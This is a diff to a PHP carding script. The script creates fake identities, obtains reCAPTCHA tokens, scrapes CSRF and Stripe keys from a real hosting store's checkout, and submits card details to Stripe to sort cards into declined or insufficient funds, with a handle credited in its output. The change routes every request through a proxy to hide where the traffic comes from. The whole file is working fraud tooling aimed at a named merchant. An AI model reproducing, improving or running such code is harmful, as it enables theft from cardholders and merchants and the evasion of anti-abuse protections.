@@ -43,7 +43,7 @@ $proxypass = $usrproxy[3];
 $proxy = "$proxyip:$proxyport";
 $user = "$proxyusr:$proxypass";
 
-echo "#Proxy:「{$proxydefault}」\n\n";
+echo "#Proxy:「{$proxydefault}」\n";
 function value($str,$find_start,$find_end)
 {
     $start = @strpos($str,$find_start);
@@ -69,7 +69,7 @@ if (strlen($ano) == 2) {
 }
 ######################################################################################################
 $ch = curl_init();
-
+curl_setopt($ch, CURLOPT_PROXY, $proxydefault);
 curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
@@ -84,7 +84,7 @@ $last = trim(strip_tags(getStr($curl,'"last":"','"')));
 $email = ''.$first.'.'.$last.'@gmail.com';
 ######################################################################################################
 $ch = curl_init();
-
+curl_setopt($ch, CURLOPT_PROXY, $proxydefault);
 curl_setopt($ch, CURLOPT_URL, 'https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LdBopUaAAAAAMNFTecuFkhyAq-ThETzVAEmJpLd&co=aHR0cHM6Ly9ob3N0aW5nLnJlYnNkZXNpZ25zLmNvbTo0NDM.&hl=en&v=GUGrl5YkSwpBsxsF3eY665Ye&size=invisible&cb=wosvnihspm4w');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -114,7 +114,7 @@ curl_close($ch);
 // echo "<br><hr>ADDRESS => $redirectUrl<br>";
 #####################################################################################################
 $ch = curl_init();
-
+curl_setopt($ch, CURLOPT_PROXY, $proxydefault);
 curl_setopt($ch, CURLOPT_URL, 'https://www.google.com/recaptcha/api2/reload?k=6LdBopUaAAAAAMNFTecuFkhyAq-ThETzVAEmJpLd');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -143,7 +143,7 @@ curl_close($ch);
 // echo "<br><hr>FINAL_TOKEN => $body<br>";
 ####################################################################################################
 $ch = curl_init();
-
+curl_setopt($ch, CURLOPT_PROXY, $proxydefault);
 curl_setopt($ch, CURLOPT_URL, 'https://hosting.rebsdesigns.com/index.php?rp=/store/discord-bot-hosting/generic');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
@@ -162,7 +162,7 @@ $csf = trim(strip_tags(getStr($curl, "csrfToken = '", "'")));
 // echo "<br><hr>csrfToken => $csf<br>";
 #########################################################################
 $ch = curl_init();
-
+curl_setopt($ch, CURLOPT_PROXY, $proxydefault);
 curl_setopt($ch, CURLOPT_URL, 'https://hosting.rebsdesigns.com/cart.php');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_POST, 1);
@@ -181,7 +181,7 @@ curl_close($ch);
 // echo "<br><hr>curl => $curl<br>";
 ########################################
 $ch = curl_init();
-
+curl_setopt($ch, CURLOPT_PROXY, $proxydefault);
 curl_setopt($ch, CURLOPT_URL, 'https://hosting.rebsdesigns.com/cart.php?a=checkout&e=false');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
@@ -201,7 +201,7 @@ $pi = trim(strip_tags(getStr($curl, "stripe = Stripe('", "'")));
 // echo "<br><hr>pi => $pi<br>";die();
 #########################################################
 $ch = curl_init();
-
+curl_setopt($ch, CURLOPT_PROXY, $proxydefault);
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_POST, 1);
@@ -225,7 +225,7 @@ if (empty($id)) {
 }
 #########################################################
 $ch = curl_init();
-
+curl_setopt($ch, CURLOPT_PROXY, $proxydefault);
 curl_setopt($ch, CURLOPT_URL, 'https://hosting.rebsdesigns.com/index.php?rp=/stripe/payment/intent');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_POST, 1);
@@ -257,5 +257,24 @@ if(strpos($curl, 'Your card has insufficient funds.')){
     echo '#Declined '.$ip.'「Declined : '.$error.' : @luffy_dxD」';
     }
     
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 ?>
